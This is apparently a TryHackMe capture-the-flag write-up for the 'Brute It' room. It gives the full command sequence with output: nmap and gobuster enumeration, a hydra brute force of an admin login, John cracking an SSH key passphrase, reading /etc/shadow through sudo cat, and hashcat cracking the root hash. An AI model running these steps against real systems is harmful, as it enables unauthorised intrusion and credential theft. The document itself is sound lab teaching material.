## Brute It | TryHackMe

This is the link for the room [Brute It](https://tryhackme.com/room/bruteit)

<img src="https://user-images.githubusercontent.com/67650329/217137381-3c67f2a8-a1bb-4b77-9882-53356133e60c.png" width="250px" align="center">

---
Learn how to brute, hash cracking and escalate privileges in this box!

Let's Go.

`nmap -sS -sV [TARGET]`

- -sS = TCP SYN scan.
- -sV = Version of services.

This is the result for the scanning with nmap tools.
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-11 00:07 EST
Nmap scan report for TARGET
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port open:

- 22 = SSH.
- 80 = http.

After we got the open port. We can search directory with gobuster tools.

`gobuster dir -u [TARGET] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -n -t 250`

- -u = Url Target.
- -w = Wordlist.
- -f = Nospam.
- -n = No Status just result (Nospam).
- -t = Thread.

This is the result for the scanning with gobuster tools.
```
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.164.83
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Add Slash:               true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2023/01/11 00:09:01 Starting gobuster in directory enumeration mode
===============================================================
/admin/               [Size: 671]
```
We got the admin login page. After that i think we can try use burp suite.
```
POST /admin/ HTTP/1.1
…
…
…
user=asd&pass=asd
```
We can see user and pass is display on request.

So we can try brute force it use hydra.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz [TARGET] http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"`

- -l = Specify a username.
- -P = Wordlist.
- http-post-form = Specify the type of login form used in a web application attack.

This is the result for the brute force with hydra tools.
```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-11 00:19:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.164.83:80/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid
[80][http-post-form] host: 10.10.164.83   login: admin   password: x***r
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-11 00:20:32
```
We got the password and We are in to the admin dashboard.

<img src="https://user-images.githubusercontent.com/67650329/217141154-4bb95800-9762-4daa-b71a-08cfac88bca3.png" width="450px" align="center">

We can see on admin dashboard have RSA Private Key.

We can download it and crack, use John The Ripper tools.
```
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/home/kali/Downloads/rockyou.txt id_rsa.hash
Press 'q' or Ctrl-C to abort, almost any other key for status
r***l     (id_rsa)
```
BOOM!!!. We got the password.

We can try login into the ssh.

`ssh -i id_rsa john@[TARGET]`
```
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{***}
```
After we get in we got the user.

And after that we can try use command `sudo -l`
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
We got the directory to exploit `/bin/cat`

We can use [gtfobinds](https://gtfobins.github.io/gtfobins/cat/) to exploit the directory.
```
john@bruteit:/$ sudo cat /etc/shadow
root:$6$zdk0.j***L.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
…
…
```
We got the root hash on `/etc/shadow`

Now we must crack the password using hashcat.

`hashcat -m 1800 text.txt rockyou.txt`

```
…
…
$6$zdk0.j***L.:f***l
…
…
```
We got the root password.

And we can try login it.
```
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# cat /root/root.txt
```
We got the root :)

Thank you for reading 👋.

---
